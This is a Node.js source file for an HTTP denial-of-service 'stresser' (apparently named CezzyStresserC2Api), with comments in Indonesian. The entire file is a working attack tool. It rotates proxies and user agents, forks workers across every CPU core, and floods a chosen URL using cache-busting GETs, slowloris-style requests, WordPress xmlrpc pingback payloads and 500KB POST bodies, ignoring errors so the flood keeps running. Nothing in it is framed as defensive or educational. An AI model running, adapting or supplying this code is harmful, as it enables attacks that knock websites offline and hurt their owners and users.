const http = require('http');
const https = require('https');
const cluster = require('cluster');
const os = require('os');
const fs = require('fs');
const readline = require('readline');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');
const chalk = require('chalk');

const cpuCount = os.cpus().length;

// --- FUNGSI BACA PROXY ---
function loadProxies() {
    if (!fs.existsSync('proxy.txt')) return [];
    const lines = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(l => l.trim() && !l.startsWith('#'));
    return lines.map(line => {
        if (line.includes('://')) return line;
        let parts = line.split(':');
        if (parts.length === 4) return `http://${parts[2]}:${parts[3]}@${parts[0]}:${parts[1]}`;
        if (parts.length === 2) return `http://${parts[0]}:${parts[1]}`;
        return null;
    }).filter(p => p);
}

const proxies = loadProxies();

// --- FUNGSI HEADER RANDOM ---
function getHeaders() {
    const userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
    ];
    return {
        'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Cache-Control': 'max-age=0'
    };
}

// --- FUNGSI ATTACK ---
async function attackWorker(targetUrl, method, endTime) {
    let agent = null;
    if (proxies.length > 0) {
        const proxy = proxies[Math.floor(Math.random() * proxies.length)];
        agent = new HttpsProxyAgent(proxy);
    }

    while (Date.now() < endTime) {
        try {
            const headers = getHeaders();
            const config = { headers, timeout: 3000, httpsAgent: agent };

            if (method === 'bypass-r2') {
                await axios.get(`${targetUrl}/${Math.random().toString(36).substring(7)}`, config);
            } else if (method === 'h2-bypass') {
                await axios.get(targetUrl, config);
            } else if (method === 'http-blitz') {
                if (Math.random() > 0.5) await axios.get(`${targetUrl}?blitz=${Math.random().toString(36).substring(7)}`, config);
                else await axios.post(`${targetUrl}?blitz=${Math.random().toString(36).substring(7)}`, { data: 'cezzy' }, config);
            } else if (method === 'flash') {
                await axios.get(targetUrl, config);
            } else if (method === 'fastduck') {
                // FASTDUCK METHOD: GET super cepat dengan random query
                const rand = Math.random().toString(36).substring(2, 15);
                await axios.get(`${targetUrl}?fd=${rand}`, config);
            } else if (method === 'slowloris') {
                config.headers['X-Keep-Alive'] = Math.floor(Math.random() * 9999);
                await axios.get(targetUrl, { ...config, timeout: 15000 });
                await new Promise(r => setTimeout(r, 1000));
            } else if (method === 'xmlrpc') {
                const payload = `<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>${targetUrl}</string></value></param><param><value><string>${targetUrl}</string></value></param></params></methodCall>`;
                await axios.post(`${targetUrl}/xmlrpc.php`, payload, { ...config, headers: { ...headers, 'Content-Type': 'text/xml' } });
            } else if (method === 'post-heavy') {
                await axios.post(targetUrl, { data: 'A'.repeat(500000) }, config);
            }
        } catch (e) {
            // Abaikan error (Timeout/403) biar loop jalan terus
        }
    }
}

// --- MASTER PROCESS (CLI) ---
if (cluster.isMaster) {
    console.clear();
    console.log(chalk.magenta(`
      ██████╗███████╗███████╗███████╗██╗   ██╗
     ██╔════╝██╔════╝╚══███╔╝╚══███╔╝╚██╗ ██╔╝
     ██║     █████╗    ███╔╝   ███╔╝  ╚████╔╝ 
     ██║     ██╔══╝   ███╔╝   ███╔╝    ╚██╔╝  
     ╚██████╗███████╗███████╗███████╗   ██║   
      ╚═════╝╚══════╝╚══════╝╚══════╝   ╚═╝   
                 S T R E S S E R (JS Edition)
    `));

    console.log(chalk.cyan(`[+] Proxies Loaded: ${proxies.length} IP`));
    console.log(chalk.cyan(`[+] CPU Cores: ${cpuCount}\n`));
    console.log(chalk.yellow(`[!] Format: <method> <url> <time> <concurrency>`));
    console.log(chalk.yellow(`[!] Example: fastduck https://target.com 60 500\n`));
    
    // UPDATE DAFTAR METHOD DI BANNER
    console.log(chalk.green(`Methods: bypass-r2, h2-bypass, http-blitz, flash, fastduck, slowloris, xmlrpc, post-heavy\n`));

    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    const prompt = chalk.red('root ') + chalk.white(': ') + chalk.magenta('CezzyStresserC2Api ') + chalk.white(':1337 > ');

    rl.on('line', (line) => {
        const args = line.trim().split(/\s+/);
        if (args.length < 4) return console.log(chalk.red('Format salah cuy! (method url time concurrency)'));

        const method = args[0].toLowerCase();
        const targetUrl = args[1];
        const duration = parseInt(args[2]);
        const totalConcurrency = parseInt(args[3]) || 100;

        // UPDATE VALIDASI METHOD
        const validMethods = ['bypass-r2', 'h2-bypass', 'http-blitz', 'flash', 'fastduck', 'slowloris', 'xmlrpc', 'post-heavy'];
        if (!validMethods.includes(method)) return console.log(chalk.red('Method tidak dikenali!'));

        console.log(chalk.green(`\n[+] Meluncurkan serangan ${method.toUpperCase()} ke ${targetUrl}`));
        console.log(chalk.green(`[+] Durasi: ${duration}s | Concurrency: ${totalConcurrency} (${Math.ceil(totalConcurrency / cpuCount)} per Core)\n`));

        const endTime = Date.now() + (duration * 1000);
        const concurrencyPerCore = Math.ceil(totalConcurrency / cpuCount);

        for (let i = 0; i < cpuCount; i++) {
            const worker = cluster.fork();
            worker.send({ targetUrl, method, endTime, concurrency: concurrencyPerCore });
        }

        cluster.on('exit', () => {
            if (Object.keys(cluster.workers).length === 0) {
                console.log(chalk.green(`\n[+] Attack Selesai!`));
                rl.prompt();
            }
        });
    });

    rl.prompt();
} else {
    // --- WORKER PROCESS (EKSEKUSI) ---
    process.on('message', async (msg) => {
        const { targetUrl, method, endTime, concurrency } = msg;
        const tasks = [];
        for (let i = 0; i < concurrency; i++) {
            tasks.push(attackWorker(targetUrl, method, endTime));
        }
        await Promise.all(tasks);
        process.exit(0);
    });
}